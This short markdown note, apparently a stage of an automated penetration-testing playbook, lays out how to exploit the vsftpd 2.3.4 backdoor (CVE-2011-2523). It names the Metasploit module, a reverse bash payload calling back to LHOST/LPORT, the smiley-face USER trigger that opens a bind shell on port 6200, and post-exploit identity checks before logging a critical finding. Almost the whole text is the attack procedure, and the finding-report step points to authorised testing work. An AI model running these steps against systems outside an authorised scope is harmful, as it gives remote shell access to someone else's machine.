# stage: exploit

## CVE-2011-2523 / vsftpd 2.3.4 backdoor

- Module: `exploit/unix/ftp/vsftpd_234_backdoor`
- Payload: `cmd/unix/reverse_bash` with LHOST/LPORT (not `cmd/unix/interact`)
- Trigger: `:USER` with `:)`, bind shell on 6200 then reverse inject
- Success: `Session N created` then post-exploit `whoami` / `id`
- Report with report_finding severity=critical, 3-gate: no session → session created → proof output
